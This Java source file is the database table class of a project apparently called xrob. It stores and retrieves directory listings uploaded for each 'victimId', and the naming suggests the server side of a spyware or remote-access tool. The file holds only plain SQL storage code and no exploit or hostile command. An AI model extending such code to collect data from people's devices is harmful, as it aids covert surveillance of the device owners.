package com.theah64.xrob.api.database.tables;

import com.sun.istack.internal.Nullable;
import com.theah64.xrob.api.database.Connection;
import com.theah64.xrob.api.models.File;
import com.theah64.xrob.api.models.FileBundle;
import com.theah64.xrob.api.utils.DarKnight;
import org.json.JSONArray;
import org.json.JSONException;
import org.json.JSONObject;

import java.sql.PreparedStatement;
import java.sql.ResultSet;
import java.sql.SQLException;
import java.util.ArrayList;
import java.util.List;

/**
 * Created by theapache64 on 16/9/16,9:25 PM.
 */
public class Files extends BaseTable<File> {

    private static final String COLUMN_FILE_NAME = "file_name";
    public static final String COLUMN_PARENT_ID = "parent_id";
    private static final String COLUMN_IS_DIRECTORY = "is_directory";
    private static final String COLUMN_FILE_SIZE_IN_KB = "file_size_in_kb";
    private static final String COLUMN_ABSOLUTE_PARENT_PATH = "absolute_parent_path";
    private static final String ABSOLUTE_ROOT = "/";
    public static final String COLUMN_FILE_ID = "file_id";
    public static final String COLUMN_FILE_HASH = "file_hash";
    private static final String TABLE_NAME_FILES = "files";

    private Files() {
    }

    private static final Files instance = new Files();

    public static Files getInstance() {
        return instance;
    }

    @Override
    public void addv2(@Nullable String victimId, JSONArray jaFiles) throws RuntimeException, JSONException {

        //Exploding new file structures
        //Crearing file bundle
        final String bundleId = FileBundles.getInstance().addv3(new FileBundle(victimId));

        final String query = "INSERT INTO files (file_bundle_id,file_id,absolute_parent_path,file_name,parent_id,is_directory,file_size_in_kb,file_hash) VALUES (?,?,?,?,?,?,?,?);";
        final java.sql.Connection con = Connection.getConnection();
        try {
            final PreparedStatement ps = con.prepareStatement(query);
            ps.setString(1, bundleId);
            insert(ps, ABSOLUTE_ROOT, "0", jaFiles, victimId);
            ps.close();
        } catch (SQLException e) {
            e.printStackTrace();
        } finally {
            try {
                con.close();
            } catch (SQLException e) {
                e.printStackTrace();
            }
        }
    }

    private void insert(PreparedStatement ps, String absoluteParentPath, final String parentId, JSONArray jaFiles, String victimId) throws JSONException, SQLException {

        for (int i = 0; i < jaFiles.length(); i++) {

            final JSONObject joFile = jaFiles.getJSONObject(i);
            final String id = joFile.getString("id");
            final String name = joFile.getString("name");
            final long size = joFile.getLong("size");
            final boolean isDirectory = joFile.has("files");

            System.out.println(name);


            ps.setString(2, id);
            ps.setString(3, absoluteParentPath);
            ps.setString(4, name);
            ps.setString(5, parentId);
            ps.setBoolean(6, isDirectory);
            ps.setLong(7, size);
            ps.setString(8, DarKnight.getEncrypted(victimId + absoluteParentPath + name + isDirectory + size).replaceAll("/", "~"));

            if (ps.executeUpdate() != 1) {
                throw new SQLException("Failed to add file");
            }

            if (isDirectory) {
                final JSONArray jaFiles2 = joFile.getJSONArray("files");

                if (jaFiles.length() > 0) {

                    String parentPath;
                    if (absoluteParentPath.equals(ABSOLUTE_ROOT)) {
                        parentPath = ABSOLUTE_ROOT + name;
                    } else {
                        parentPath = absoluteParentPath + "/" + name;
                    }

                    insert(ps, parentPath, id, jaFiles2, victimId);
                }
            }
        }
    }

    @Override
    public List<File> getAll(String victimId, String fileParentId) {
        List<File> files = null;
        final String query = " SELECT file_id,file_name,absolute_parent_path,file_size_in_kb, is_directory,file_hash FROM files WHERE victim_id = ? AND parent_id = ? AND is_active =1;";
        final java.sql.Connection con = Connection.getConnection();
        try {
            final PreparedStatement ps = con.prepareStatement(query);
            ps.setString(1, victimId);
            ps.setString(2, fileParentId);

            final ResultSet rs = ps.executeQuery();
            if (rs.first()) {
                files = new ArrayList<>();
                do {
                    final String fileId = rs.getString(COLUMN_FILE_ID);
                    final String fileName = rs.getString(COLUMN_FILE_NAME);
                    final String absoluteParentPath = rs.getString(COLUMN_ABSOLUTE_PARENT_PATH);
                    final String fileSizeInKB = rs.getString(COLUMN_FILE_SIZE_IN_KB);
                    final boolean isDirectory = rs.getBoolean(COLUMN_IS_DIRECTORY);
                    final String fileHash = rs.getString(COLUMN_FILE_HASH);

                    files.add(new File(fileId, fileName, absoluteParentPath, fileSizeInKB, fileHash, isDirectory));
                } while (rs.next());
            }

            rs.close();
            ps.close();

        } catch (SQLException e) {
            e.printStackTrace();
        } finally {
            try {
                con.close();
            } catch (SQLException e) {
                e.printStackTrace();
            }
        }
        return files;
    }

    @Override
    public String get(String byColumn, String byValues, String columnToReturn) {
        return super.getV2(TABLE_NAME_FILES, byColumn, byValues, columnToReturn);
    }
}
